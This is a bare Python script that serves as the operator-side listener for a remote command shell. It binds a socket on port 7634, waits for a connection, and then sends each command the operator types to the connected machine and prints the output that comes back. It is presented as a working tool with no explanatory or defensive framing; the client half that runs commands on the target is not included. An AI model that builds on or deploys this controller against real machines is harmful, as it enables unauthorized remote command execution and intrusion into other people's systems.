import socket
import subprocess
import os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host = "127.0.1.1"
port = 7634
HEADER = 64

s.bind((host,port))
s.listen(1)
con, addr=s.accept()

print(f"connected with {addr}")
while True:
    cmd=input("$ ")
    cmd_len = len(cmd)
    cmd_len = str(cmd_len).encode()
    cmd_len += b' ' * (HEADER - len(cmd_len))
    con.send(cmd_len)
    con.send(cmd.encode())
    cmd_len = c_cmd=con.recv(HEADER)
    c_cmd= con.recv(int(cmd_len))

    print(f"{host}: \n{c_cmd.decode()}")
